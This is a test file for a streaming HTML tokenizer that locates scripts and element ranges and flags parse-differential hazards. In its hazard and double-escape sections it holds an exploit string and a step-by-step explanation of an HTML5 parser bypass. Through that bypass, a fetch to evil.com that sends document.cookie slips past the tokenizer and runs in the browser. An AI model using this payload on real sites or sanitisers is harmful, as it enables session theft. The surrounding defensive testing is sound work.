import { describe, it, expect } from 'vitest';
import { createUint8Tokenizer, createUtf8Tokenizer } from '../../core/html-tokenizer.js';

const enc = (s) => new TextEncoder().encode(s);
const dec = (u8) => new TextDecoder().decode(u8);

function run(html, callbacks) {
    const tok = createUint8Tokenizer(callbacks);
    tok.push(enc(html));
    tok.finish();
}

// Collect all events from a tokenizer run over a complete HTML string
function collect(html) {
    const scripts = [];
    const opens = [];
    const closes = [];
    run(html, {
        onScript: (s) => scripts.push(s),
        onElementOpen: (e) => opens.push(e),
        onElementClose: (e) => closes.push(e),
    });
    return { scripts, opens, closes };
}

// Same but push one byte at a time to stress chunk boundaries
function collectByteByByte(html) {
    const bytes = enc(html);
    const scripts = [];
    const opens = [];
    const closes = [];
    const t = createUint8Tokenizer({
        onScript: (s) => scripts.push(s),
        onElementOpen: (e) => opens.push(e),
        onElementClose: (e) => closes.push(e),
    });
    for (let i = 0; i < bytes.length; i++) {
        t.push(bytes.slice(i, i + 1));
    }
    t.finish();
    return { scripts, opens, closes };
}

// Slice the original HTML string at byte positions returned by the tokenizer
function sliceAt(html, start, end) {
    return html.slice(start, end);
}

// ── script detection ──────────────────────────────────────────────────────────

describe('script detection', () => {
    it('finds a simple inline script', () => {
        const html = '<html><script>alert(1)</script></html>';
        const { scripts } = collect(html);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('alert(1)');
        expect(sliceAt(html, scripts[0].startIndex, scripts[0].endIndex)).toBe(
            '<script>alert(1)</script>'
        );
    });

    it('records contentStart and contentEnd accurately', () => {
        const html = '<html><script>hello</script></html>';
        const bytes = enc(html);
        const { scripts } = collect(html);
        const s = scripts[0];
        expect(dec(bytes.slice(s.contentStart, s.contentEnd))).toBe('hello');
    });

    it('is case-insensitive for </SCRIPT>', () => {
        const html = '<script>x</SCRIPT>';
        const { scripts } = collect(html);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('x');
    });

    it('is case-insensitive for </Script>', () => {
        const html = '<script>x</Script>';
        const { scripts } = collect(html);
        expect(scripts).toHaveLength(1);
    });

    it('collects script attributes', () => {
        const html = '<script type="module" async src="/app.js"></script>';
        const { scripts } = collect(html);
        expect(scripts[0].attrs).toEqual({ type: 'module', async: '', src: '/app.js' });
    });

    it('treats </not-script> inside a script as content', () => {
        const html = '<script>if (a</b>c) {}</script>';
        const { scripts } = collect(html);
        expect(dec(scripts[0].content)).toBe('if (a</b>c) {}');
    });

    it('treats </scripta> as content, not the closing tag', () => {
        const html = '<script>x</scripta>y</script>';
        const { scripts } = collect(html);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('x</scripta>y');
    });

    it('handles < that is not a tag as content', () => {
        const html = '<script>a < b</script>';
        const { scripts } = collect(html);
        expect(dec(scripts[0].content)).toBe('a < b');
    });

    it('handles </ that is not a closing tag as content', () => {
        const html = '<script>a</ b</script>';
        const { scripts } = collect(html);
        expect(dec(scripts[0].content)).toBe('a</ b');
    });

    it('handles consecutive < characters in script content', () => {
        const html = '<script>a << b</script>';
        const { scripts } = collect(html);
        expect(dec(scripts[0].content)).toBe('a << b');
    });

    it('handles </script followed by more name chars then a real close', () => {
        // </scripting> is not the close; </script> is
        const html = '<script>a</scripting>b</script>';
        const { scripts } = collect(html);
        expect(dec(scripts[0].content)).toBe('a</scripting>b');
    });

    it('handles </script> with whitespace before >', () => {
        const html = '<script>x</script >';
        const { scripts } = collect(html);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('x');
    });

    it('finds multiple scripts in one document', () => {
        const html = '<script>one</script><p>text</p><script>two</script>';
        const { scripts } = collect(html);
        expect(scripts).toHaveLength(2);
        expect(dec(scripts[0].content)).toBe('one');
        expect(dec(scripts[1].content)).toBe('two');
    });

    it('handles empty script', () => {
        const html = '<script></script>';
        const { scripts } = collect(html);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('');
    });

    it('matches the Next.js RSC push pattern', () => {
        const rscContent = 'self.__next_f.push([1,"data"])';
        const html = `<script>${rscContent}</script>`;
        const { scripts } = collect(html);
        expect(dec(scripts[0].content)).toBe(rscContent);
    });

    it('handles script with src attribute (no content)', () => {
        const html = '<script src="/app.js"></script>';
        const { scripts } = collect(html);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('');
        expect(scripts[0].attrs.src).toBe('/app.js');
    });

    it('does not fire onScript for script inside a comment', () => {
        const html = '<!-- <script>evil</script> --><p>ok</p>';
        const { scripts } = collect(html);
        expect(scripts).toHaveLength(0);
    });

    it('handles a script that begins right at the start of a chunk boundary', () => {
        const html = '<p>x</p><script>content</script>';
        const bytes = enc(html);
        // Split right at the '<' of '<script>'
        const splitAt = html.indexOf('<script>');
        const scripts = [];
        const t = createUint8Tokenizer({ onScript: (s) => scripts.push(s) });
        t.push(bytes.slice(0, splitAt));
        t.push(bytes.slice(splitAt));
        t.finish();
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('content');
    });

    it('produces identical results byte-by-byte vs full push', () => {
        const html =
            '<!DOCTYPE html><html><body>' +
            '<script type="module">self.__next_f.push([1,"a"])</script>' +
            '<p>text</p>' +
            '<script>console.log(1 < 2)</script>' +
            '</body></html>';
        const full = collect(html);
        const streamed = collectByteByByte(html);
        expect(streamed.scripts).toHaveLength(full.scripts.length);
        for (let i = 0; i < full.scripts.length; i++) {
            expect(dec(streamed.scripts[i].content)).toBe(dec(full.scripts[i].content));
            expect(streamed.scripts[i].startIndex).toBe(full.scripts[i].startIndex);
            expect(streamed.scripts[i].endIndex).toBe(full.scripts[i].endIndex);
        }
    });
});

// ── element open / close ──────────────────────────────────────────────────────

describe('element open/close events', () => {
    it('fires open and close for a regular element', () => {
        const html = '<div>text</div>';
        const { opens, closes } = collect(html);
        expect(opens).toHaveLength(1);
        expect(opens[0].tagName).toBe('div');
        expect(opens[0].startIndex).toBe(0);
        expect(closes).toHaveLength(1);
        expect(closes[0].tagName).toBe('div');
        expect(closes[0].endIndex).toBe(html.length);
    });

    it('fires open and immediate close for void elements', () => {
        const html = '<br>';
        const { opens, closes } = collect(html);
        expect(opens).toHaveLength(1);
        expect(closes).toHaveLength(1);
        expect(opens[0].tagName).toBe('br');
        expect(closes[0].tagName).toBe('br');
        // Both point to the same element end
        expect(opens[0].attrEnd).toBe(closes[0].endIndex);
    });

    it('fires open and immediate close for self-closing tags', () => {
        const html = '<br/>';
        const { opens, closes } = collect(html);
        expect(opens).toHaveLength(1);
        expect(closes).toHaveLength(1);
        expect(closes[0].tagName).toBe('br');
    });

    it('does not fire for <img> closing tag (void)', () => {
        // <img> is void — a stray </img> fires a separate close
        const html = '<img src="x.png">';
        const { opens, closes } = collect(html);
        expect(opens).toHaveLength(1);
        expect(opens[0].attrs.src).toBe('x.png');
        // The void-element close fires immediately
        expect(closes).toHaveLength(1);
        expect(closes[0].endIndex).toBe(html.length);
    });

    it('collects attributes on open events', () => {
        const html = '<div id="container" class="main active">';
        const { opens } = collect(html);
        expect(opens[0].attrs.id).toBe('container');
        expect(opens[0].attrs.class).toBe('main active');
    });

    it('handles boolean attributes', () => {
        const html = '<input disabled type="text">';
        const { opens } = collect(html);
        expect(opens[0].attrs.disabled).toBe('');
        expect(opens[0].attrs.type).toBe('text');
    });

    it('handles single-quoted attribute values', () => {
        const html = "<div class='foo bar'>";
        const { opens } = collect(html);
        expect(opens[0].attrs.class).toBe('foo bar');
    });

    it('handles unquoted attribute values', () => {
        const html = '<div class=foo>';
        const { opens } = collect(html);
        expect(opens[0].attrs.class).toBe('foo');
    });

    it('normalises tag names and attribute names to lowercase', () => {
        const html = '<DIV CLASS="x"></DIV>';
        const { opens, closes } = collect(html);
        expect(opens[0].tagName).toBe('div');
        expect(opens[0].attrs.class).toBe('x');
        expect(closes[0].tagName).toBe('div');
    });

    it('fires attrEnd pointing one past the opening >', () => {
        const html = '<div id="x">content</div>';
        const { opens } = collect(html);
        // attrEnd should be the index of 'c' in 'content'
        expect(html[opens[0].attrEnd]).toBe('c');
    });

    it('tracks nested elements correctly', () => {
        const html = '<div><span><em>text</em></span></div>';
        const { opens, closes } = collect(html);
        expect(opens.map((e) => e.tagName)).toEqual(['div', 'span', 'em']);
        expect(closes.map((e) => e.tagName)).toEqual(['em', 'span', 'div']);
    });

    it('does not emit element events for script tags (handled by onScript)', () => {
        const html = '<div><script>x</script></div>';
        const { opens, closes } = collect(html);
        // only div should appear in opens/closes, not script
        expect(opens.every((e) => e.tagName !== 'script')).toBe(true);
        expect(closes.every((e) => e.tagName !== 'script')).toBe(true);
    });

    it('byte-by-byte streaming produces identical element events', () => {
        const html = '<section id="wrap"><p class="lead">Hello</p><br></section>';
        const full = collect(html);
        const streamed = collectByteByByte(html);
        expect(streamed.opens).toEqual(full.opens);
        expect(streamed.closes).toEqual(full.closes);
    });
});

// ── comments and doctype ──────────────────────────────────────────────────────

describe('comments and doctype', () => {
    it('ignores content inside HTML comments', () => {
        const html = '<!-- <div>not a tag</div> --><p>ok</p>';
        const { opens } = collect(html);
        expect(opens).toHaveLength(1);
        expect(opens[0].tagName).toBe('p');
    });

    it('handles -- inside a comment without ending it early', () => {
        const html = '<!-- a -- b --><p>ok</p>';
        const { opens } = collect(html);
        expect(opens).toHaveLength(1);
        expect(opens[0].tagName).toBe('p');
    });

    it('handles ---> closing sequence', () => {
        const html = '<!---><p>ok</p>';
        const { opens } = collect(html);
        expect(opens).toHaveLength(1);
    });

    it('ignores <!DOCTYPE html>', () => {
        const html = '<!DOCTYPE html><html><body></body></html>';
        const { opens } = collect(html);
        expect(opens.map((e) => e.tagName)).toEqual(['html', 'body']);
    });
});

// ── index accuracy ────────────────────────────────────────────────────────────

describe('index accuracy', () => {
    it('startIndex points to the < of the opening tag', () => {
        const html = '<p>before</p><div>after</div>';
        const { opens } = collect(html);
        expect(html[opens[0].startIndex]).toBe('<');
        expect(html[opens[1].startIndex]).toBe('<');
        expect(html.slice(opens[1].startIndex, opens[1].startIndex + 4)).toBe('<div');
    });

    it('endIndex of close tag is one past the >', () => {
        const html = '<p>text</p>';
        const { closes } = collect(html);
        expect(html.slice(closes[0].endIndex - 4, closes[0].endIndex)).toBe('</p>');
    });

    it('script startIndex and endIndex wrap the full element', () => {
        const html = '<p>before</p><script>alert(1)</script><p>after</p>';
        const { scripts } = collect(html);
        expect(html.slice(scripts[0].startIndex, scripts[0].endIndex)).toBe(
            '<script>alert(1)</script>'
        );
    });

    it('contentStart and contentEnd isolate the script content bytes', () => {
        const html = '<script type="text/javascript">const x = 1;</script>';
        const bytes = enc(html);
        const { scripts } = collect(html);
        const s = scripts[0];
        expect(dec(bytes.slice(s.contentStart, s.contentEnd))).toBe('const x = 1;');
    });

    it('content Uint8Array matches bytes between contentStart and contentEnd', () => {
        const html = '<script>hello world</script>';
        const bytes = enc(html);
        const { scripts } = collect(html);
        const s = scripts[0];
        expect(Array.from(s.content)).toEqual(
            Array.from(bytes.slice(s.contentStart, s.contentEnd))
        );
    });
});

// ── finish() — unclosed script at EOF ────────────────────────────────────────

describe('finish() emits truncated scripts', () => {
    function collectFinish(html) {
        const bytes = enc(html);
        const scripts = [];
        const t = createUint8Tokenizer({ onScript: (s) => scripts.push(s) });
        t.push(bytes);
        t.finish();
        return scripts;
    }

    it('emits a script truncated in S_SCRIPT_DATA', () => {
        const html = '<script>evil()';
        const scripts = collectFinish(html);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('evil()');
        expect(scripts[0].truncated).toBe(true);
    });

    it('emits a script truncated at < (S_SCRIPT_LT)', () => {
        const html = '<script>a<';
        const scripts = collectFinish(html);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('a<');
        expect(scripts[0].truncated).toBe(true);
    });

    it('emits a script truncated at </ (S_SCRIPT_SLASH)', () => {
        const html = '<script>a</';
        const scripts = collectFinish(html);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('a</');
        expect(scripts[0].truncated).toBe(true);
    });

    it('emits a script truncated mid end-tag name (S_SCRIPT_END)', () => {
        const html = '<script>a</scri';
        const scripts = collectFinish(html);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('a</scri');
        expect(scripts[0].truncated).toBe(true);
    });

    it('emits confirmed content when truncated after </script (S_SCRIPT_END_WAIT)', () => {
        // </script is confirmed but the > was never seen
        const html = '<script>content</script ';
        const scripts = collectFinish(html);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('content');
        expect(scripts[0].truncated).toBe(true);
    });

    it('does not emit if no script was open at EOF', () => {
        const scripts = collectFinish('<p>no script here</p>');
        expect(scripts).toHaveLength(0);
    });

    it('emits normally closed scripts before emitting the truncated one', () => {
        const html = '<script>first</script><script>second';
        const scripts = collectFinish(html);
        expect(scripts).toHaveLength(2);
        expect(dec(scripts[0].content)).toBe('first');
        expect(scripts[0].truncated).toBeUndefined();
        expect(dec(scripts[1].content)).toBe('second');
        expect(scripts[1].truncated).toBe(true);
    });

    it('byte-by-byte streaming also emits truncated scripts', () => {
        const html = '<script>x</scri';
        const bytes = enc(html);
        const scripts = [];
        const t = createUint8Tokenizer({ onScript: (s) => scripts.push(s) });
        for (let i = 0; i < bytes.length; i++) t.push(bytes.slice(i, i + 1));
        t.finish();
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('x</scri');
        expect(scripts[0].truncated).toBe(true);
    });
});

// ── cancellation ──────────────────────────────────────────────────────────────

describe('cancellation via ctl', () => {
    it('cancel() in onScript stops further callbacks', () => {
        const html = '<script>one</script><script>two</script><script>three</script>';
        const seen = [];
        run(html, {
            onScript({ content }, ctl) {
                seen.push(dec(content));
                ctl.cancel();
            },
        });
        expect(seen).toEqual(['one']);
    });

    it('cancel() in onElementOpen stops further callbacks', () => {
        const html = '<p>a</p><div>b</div><span>c</span>';
        const seen = [];
        run(html, {
            onElementOpen({ tagName }, ctl) {
                seen.push(tagName);
                if (tagName === 'div') ctl.cancel();
            },
        });
        expect(seen).toEqual(['p', 'div']);
    });

    it('cancelled tokenizer does not emit from finish()', () => {
        const html = '<script>open';
        const bytes = enc(html);
        const scripts = [];
        const t = createUint8Tokenizer({ onScript: (s) => scripts.push(s) });
        t.push(bytes);
        t.cancel();
        t.finish();
        expect(scripts).toHaveLength(0);
    });

    it('external cancel() has the same effect as ctl.cancel()', () => {
        const html = '<p>a</p><p>b</p>';
        const seen = [];
        const t = createUint8Tokenizer({
            onElementOpen({ tagName }) {
                seen.push(tagName);
            },
        });
        const bytes = enc(html);
        // Cancel after push starts but before it can process any bytes
        t.cancel();
        t.push(bytes);
        t.finish();
        expect(seen).toHaveLength(0);
    });
});

// ── M3 nesting depth tracking (caller pattern) ───────────────────────────────

describe('nesting depth tracking for selector-based strips (M3 pattern)', () => {
    it('caller can find full byte range of element with id="target"', () => {
        const html =
            '<div>' + '<div id="target"><span>inner</span></div>' + '<p>after</p>' + '</div>';

        const stack = [];
        const found = [];
        run(html, {
            onElementOpen({ tagName, startIndex, attrs }) {
                stack.push({ tagName, startIndex, track: attrs.id === 'target' });
            },
            onElementClose({ tagName, endIndex }) {
                for (let i = stack.length - 1; i >= 0; i--) {
                    if (stack[i].tagName === tagName) {
                        const item = stack.splice(i, 1)[0];
                        if (item.track) {
                            found.push({ startIndex: item.startIndex, endIndex });
                        }
                        break;
                    }
                }
            },
        });

        expect(found).toHaveLength(1);
        expect(html.slice(found[0].startIndex, found[0].endIndex)).toBe(
            '<div id="target"><span>inner</span></div>'
        );
    });

    it('caller correctly handles nested elements of the same tag name', () => {
        const html = '<div id="outer"><div><span>x</span></div></div>';
        const stack = [];
        const found = [];
        run(html, {
            onElementOpen({ tagName, startIndex, attrs }) {
                stack.push({ tagName, startIndex, track: attrs.id === 'outer' });
            },
            onElementClose({ tagName, endIndex }) {
                for (let i = stack.length - 1; i >= 0; i--) {
                    if (stack[i].tagName === tagName) {
                        const item = stack.splice(i, 1)[0];
                        if (item.track) {
                            found.push({ startIndex: item.startIndex, endIndex });
                        }
                        break;
                    }
                }
            },
        });
        expect(found).toHaveLength(1);
        expect(html.slice(found[0].startIndex, found[0].endIndex)).toBe(html);
    });

    it('void elements inside tracked region do not confuse close-tag matching', () => {
        const html = '<section id="region"><p>text<br>more</p></section>';
        const stack = [];
        const found = [];
        run(html, {
            onElementOpen({ tagName, startIndex, attrs }) {
                stack.push({ tagName, startIndex, track: attrs.id === 'region' });
            },
            onElementClose({ tagName, endIndex }) {
                for (let i = stack.length - 1; i >= 0; i--) {
                    if (stack[i].tagName === tagName) {
                        const item = stack.splice(i, 1)[0];
                        if (item.track) {
                            found.push({ startIndex: item.startIndex, endIndex });
                        }
                        break;
                    }
                }
            },
        });
        expect(found).toHaveLength(1);
        expect(html.slice(found[0].startIndex, found[0].endIndex)).toBe(html);
    });
});

// ── createUtf8Tokenizer ─────────────────────────────────────────────────────

describe('createUtf8Tokenizer', () => {
    function runStr(html, callbacks) {
        const tok = createUtf8Tokenizer(callbacks);
        tok.push(html);
        tok.finish();
    }

    it('content is a string, not a Uint8Array', () => {
        let content;
        runStr('<script>alert(1)</script>', {
            onScript: (s) => {
                content = s.content;
            },
        });
        expect(typeof content).toBe('string');
        expect(content).toBe('alert(1)');
    });

    it('matches the same script content as the byte tokenizer', () => {
        const html = '<script>self.__next_f.push([1,"data"])</script>';
        let strContent;
        let byteContent;
        runStr(html, {
            onScript: (s) => {
                strContent = s.content;
            },
        });
        const tok = createUint8Tokenizer({
            onScript: (s) => {
                byteContent = s.content;
            },
        });
        tok.push(new TextEncoder().encode(html));
        tok.finish();
        expect(strContent).toBe(new TextDecoder().decode(byteContent));
    });

    it('attrs are strings in both modes', () => {
        let attrs;
        runStr('<script type="module" src="/app.js"></script>', {
            onScript: (s) => {
                attrs = s.attrs;
            },
        });
        expect(attrs.type).toBe('module');
        expect(attrs.src).toBe('/app.js');
    });

    it('handles multiple string chunks', () => {
        const parts = ['<scri', 'pt>con', 'tent</sc', 'ript>'];
        const scripts = [];
        const tok = createUtf8Tokenizer({ onScript: (s) => scripts.push(s.content) });
        for (const p of parts) tok.push(p);
        tok.finish();
        expect(scripts).toHaveLength(1);
        expect(scripts[0]).toBe('content');
    });

    it('handles a chunk split mid-tag-name', () => {
        const scripts = [];
        const tok = createUtf8Tokenizer({ onScript: (s) => scripts.push(s.content) });
        tok.push('<scri');
        tok.push('pt>hello</script>');
        tok.finish();
        expect(scripts).toEqual(['hello']);
    });

    it('positions are code-unit indices into the original string', () => {
        const html = '<p>x</p><script>body</script>';
        let ev;
        runStr(html, {
            onScript: (s) => {
                ev = s;
            },
        });
        expect(html.slice(ev.startIndex, ev.endIndex)).toBe('<script>body</script>');
        expect(html.slice(ev.contentStart, ev.contentEnd)).toBe('body');
    });

    it('emits truncated: true for unclosed scripts', () => {
        const scripts = [];
        const tok = createUtf8Tokenizer({ onScript: (s) => scripts.push(s) });
        tok.push('<script>unclosed');
        tok.finish();
        expect(scripts).toHaveLength(1);
        expect(scripts[0].content).toBe('unclosed');
        expect(scripts[0].truncated).toBe(true);
    });

    it('on* handler detection works the same as in byte mode', () => {
        const opens = [];
        runStr('<button onclick="evil()">x</button>', {
            onElementOpen: (e) => opens.push(e),
        });
        expect(opens[0].attrs.onclick).toBe('evil()');
    });
});

// ── onHazard — parse differential hazard detection ───────────────────────────
//
// The tokenizer fires onHazard for patterns that create a parse differential
// between the tokenizer and the browser. Callers that register onHazard and
// call ctl.cancel() block the response before any script event fires.
// Callers that do not register onHazard continue normally (no implicit cancel).

describe('onHazard — script-html-comment (<!--  inside script)', () => {
    // The exploit HTML from the confirmed double-escape bypass.
    // <!--  is embedded inside the RSC push string literal.
    const EXPLOIT_HTML =
        '<script>self.__next_f.push([0,"<!--<script>"])</script>/\n' +
        'fetch("https://evil.com?c="+document.cookie)\n' +
        '</script>';

    it('fires onHazard with type script-html-comment before any onScript', () => {
        const hazards = [];
        const scripts = [];
        const tok = createUtf8Tokenizer({
            onScript: (s) => scripts.push(s.content),
            onHazard: (h) => hazards.push(h.type),
        });
        tok.push(EXPLOIT_HTML);
        tok.finish();

        expect(hazards).toEqual(['script-html-comment']);
        // Without cancel, onScript still fires (caller decides policy)
        expect(scripts).toHaveLength(1);
    });

    it('cancelling in onHazard prevents onScript from firing', () => {
        const scripts = [];
        const tok = createUtf8Tokenizer({
            onScript: (s) => scripts.push(s.content),
            onHazard: (h, ctl) => ctl.cancel(),
        });
        tok.push(EXPLOIT_HTML);
        tok.finish();

        expect(scripts).toHaveLength(0);
    });

    it('fires on <!-- regardless of what follows (not just <!--<script>)', () => {
        const hazards = [];
        const tok = createUtf8Tokenizer({
            onHazard: (h) => hazards.push(h.type),
        });
        tok.push('<script>/* <!-- legacy comment */ code()</script>');
        tok.finish();

        expect(hazards).toEqual(['script-html-comment']);
    });

    it('does NOT fire for <!-- outside a script (HTML comment in data)', () => {
        const hazards = [];
        const tok = createUtf8Tokenizer({ onHazard: (h) => hazards.push(h) });
        tok.push('<!-- <script>evil</script> --><p>ok</p>');
        tok.finish();

        expect(hazards).toHaveLength(0);
    });

    it('byte-by-byte streaming fires the same hazard', () => {
        const hazards = [];
        const bytes = enc(EXPLOIT_HTML);
        const tok = createUint8Tokenizer({ onHazard: (h) => hazards.push(h.type) });
        for (let i = 0; i < bytes.length; i++) tok.push(bytes.slice(i, i + 1));
        tok.finish();

        expect(hazards).toEqual(['script-html-comment']);
    });
});

describe('onHazard — unquoted-attr-lt (< in unquoted attribute value)', () => {
    it('fires onHazard when < appears in an unquoted attribute value', () => {
        const hazards = [];
        const tok = createUtf8Tokenizer({ onHazard: (h) => hazards.push(h.type) });
        tok.push('<div attr=foo<script>evil()</script>>');
        tok.finish();

        expect(hazards).toEqual(['unquoted-attr-lt']);
    });

    it('does NOT fire for < inside a double-quoted attribute value', () => {
        const hazards = [];
        const tok = createUtf8Tokenizer({ onHazard: (h) => hazards.push(h) });
        tok.push('<div attr="foo<bar">content</div>');
        tok.finish();

        expect(hazards).toHaveLength(0);
    });

    it('does NOT fire for < inside a single-quoted attribute value', () => {
        const hazards = [];
        const tok = createUtf8Tokenizer({ onHazard: (h) => hazards.push(h) });
        tok.push("<div attr='foo<bar'>content</div>");
        tok.finish();

        expect(hazards).toHaveLength(0);
    });

    it('cancelling in onHazard stops further processing', () => {
        const opens = [];
        const tok = createUtf8Tokenizer({
            onElementOpen: (e) => opens.push(e.tagName),
            onHazard: (h, ctl) => ctl.cancel(),
        });
        tok.push('<div attr=foo<p>after</p>');
        tok.finish();

        // The div open fires before the hazard; p does not fire after cancel
        expect(opens).not.toContain('p');
    });
});

describe('onHazard — srcdoc (embedded HTML document in attribute)', () => {
    it('fires onHazard for an element with a srcdoc attribute', () => {
        const hazards = [];
        const tok = createUtf8Tokenizer({ onHazard: (h) => hazards.push(h) });
        tok.push('<iframe srcdoc="&lt;script&gt;evil()&lt;/script&gt;"></iframe>');
        tok.finish();

        expect(hazards).toHaveLength(1);
        expect(hazards[0].type).toBe('srcdoc');
        expect(hazards[0].tagName).toBe('iframe');
    });

    it('does NOT fire onElementOpen for the srcdoc element', () => {
        const opens = [];
        const tok = createUtf8Tokenizer({
            onElementOpen: (e) => opens.push(e.tagName),
            onHazard: () => {},
        });
        tok.push('<div></div><iframe srcdoc="content"></iframe><p></p>');
        tok.finish();

        expect(opens).toContain('div');
        expect(opens).toContain('p');
        expect(opens).not.toContain('iframe');
    });

    it('fires for any element with srcdoc, not just iframe', () => {
        const hazards = [];
        const tok = createUtf8Tokenizer({ onHazard: (h) => hazards.push(h.tagName) });
        tok.push('<object srcdoc="data"></object>');
        tok.finish();

        expect(hazards).toEqual(['object']);
    });
});

// ── raw text elements ─────────────────────────────────────────────────────────
//
// <textarea>, <title>, <style>, <xmp>, <noembed>, <noscript>, <listing>,
// <plaintext> are raw text elements. The browser does not parse <script> tags
// inside them. The tokenizer enters raw text mode for these elements and
// suppresses all inner events — no onScript, no inner onElementOpen/Close.

describe('raw text elements — script suppression', () => {
    it('does not fire onScript for <script> inside <textarea>', () => {
        const { scripts } = collect('<textarea><script>evil()</script></textarea>');
        expect(scripts).toHaveLength(0);
    });

    it('does not fire onScript for <script> inside <title>', () => {
        const { scripts } = collect('<title><script>evil()</script></title>');
        expect(scripts).toHaveLength(0);
    });

    it('does not fire onScript for <script> inside <style>', () => {
        const { scripts } = collect(
            '<style>body { color: red } /* <script>evil()</script> */</style>'
        );
        expect(scripts).toHaveLength(0);
    });

    it('does not fire onScript for <script> inside <noscript>', () => {
        const { scripts } = collect('<noscript><script>evil()</script></noscript>');
        expect(scripts).toHaveLength(0);
    });

    it('fires onElementOpen for the raw text element itself', () => {
        const { opens } = collect('<textarea id="t">content</textarea>');
        expect(opens).toHaveLength(1);
        expect(opens[0].tagName).toBe('textarea');
        expect(opens[0].attrs.id).toBe('t');
    });

    it('fires onElementClose when the raw text element closes', () => {
        const { closes } = collect('<textarea>content</textarea>');
        expect(closes.map((e) => e.tagName)).toContain('textarea');
    });

    it('resumes normal parsing after the raw text element closes', () => {
        const { scripts, opens } = collect(
            '<textarea><script>ignored()</script></textarea><script>real()</script><p>ok</p>'
        );
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('real()');
        expect(opens.map((e) => e.tagName)).toContain('p');
    });

    it('does not fire inner element events for markup inside a raw text element', () => {
        const { opens } = collect(
            '<textarea><div id="x"><span>hi</span></div></textarea><p>after</p>'
        );
        // Only textarea and p should appear — not div or span
        const names = opens.map((e) => e.tagName);
        expect(names).toContain('textarea');
        expect(names).toContain('p');
        expect(names).not.toContain('div');
        expect(names).not.toContain('span');
    });

    it('handles </textarea> with whitespace before > (same as script)', () => {
        const { scripts, closes } = collect('<textarea>content</textarea >');
        expect(scripts).toHaveLength(0);
        expect(closes.map((e) => e.tagName)).toContain('textarea');
    });

    it('handles case-insensitive close tags for raw text elements', () => {
        const { scripts } = collect('<TEXTAREA><script>evil()</script></TEXTAREA>');
        expect(scripts).toHaveLength(0);
    });

    it('byte-by-byte streaming produces the same suppression', () => {
        const html = '<textarea><script>evil()</script></textarea><script>real()</script>';
        const { scripts } = collectByteByByte(html);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('real()');
    });
});

// ── HTML5 "Script Data Double Escaped" — blocked by hazard scanner ────────────
//
// Confirmed exploitable in Chrome (see scripts/verify-double-escape.js).
//
// The HTML5 spec (§13.2.6.1) defines "Script Data Double Escaped" state,
// entered when <!--<script appears inside a <script> element's raw content.
// In that state </script> does NOT close the outer script; only a second
// </script> (in "Script Data Escaped" state) closes it.
//
// The tokenizer does not implement the Double Escaped states. Instead it fires
// onHazard('script-html-comment') at the third character of <!--, before any
// </script> is seen. Callers that cancel on hazard block the response entirely.
// Callers that do not register onHazard still close at the first </script>
// (the parse differential remains for unprotected callers).
//
// The injected / after </script> closes the regex the JS engine opens at <,
// making the JS valid. A newline then triggers ASI:
//
//   <script>self.__next_f.push([0,"<!--<script>"])</script>/   ← tokenizer closes here
//   fetch("https://evil.com?c="+document.cookie)               ← browser executes
//   </script>                                                   ← browser closes here

describe('HTML5 script-data double-escape — behaviour without onHazard handler', () => {
    const EXPLOIT_HTML =
        '<script>self.__next_f.push([0,"<!--<script>"])</script>/\n' +
        'fetch("https://evil.com?c="+document.cookie)\n' +
        '</script>';

    it('without onHazard: byte tokenizer still closes at the first </script>', () => {
        const { scripts } = collect(EXPLOIT_HTML);

        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('self.__next_f.push([0,"<!--<script>"])');
        expect(dec(scripts[0].content)).not.toContain('fetch(');
    });

    it('without onHazard: string tokenizer has the same behaviour', () => {
        const seen = [];
        const tok = createUtf8Tokenizer({ onScript: (s) => seen.push(s.content) });
        tok.push(EXPLOIT_HTML);
        tok.finish();

        expect(seen).toHaveLength(1);
        expect(seen[0]).not.toContain('fetch(');
    });

    it('without onHazard: byte-by-byte streaming shows the same behaviour', () => {
        const { scripts } = collectByteByByte(EXPLOIT_HTML);
        expect(scripts).toHaveLength(1);
        expect(dec(scripts[0].content)).toBe('self.__next_f.push([0,"<!--<script>"])');
    });
});
